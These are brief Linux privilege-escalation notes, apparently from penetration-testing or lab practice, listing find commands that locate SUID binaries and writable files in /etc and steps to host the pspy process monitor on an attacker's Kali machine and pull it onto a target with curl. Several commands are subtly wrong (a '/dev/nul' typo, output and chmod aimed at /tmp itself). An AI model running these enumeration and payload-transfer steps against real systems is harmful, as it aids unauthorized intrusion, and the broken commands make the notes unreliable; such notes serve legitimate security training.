# Linux
### find
1. SUID
```sh
find / -perm -u=s -type f 2>/dev/nul
```
2. Writable files
```sh
find /etc -type f -writable 2>/dev/null
```

### Installing pspy
```sh
#At kali machine  
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
python3 -m http.server 80  
#at target machine  
curl http://$kaliIP/pspy64 -o /tmp 
chmod +x /tmp 
./pspy64
```
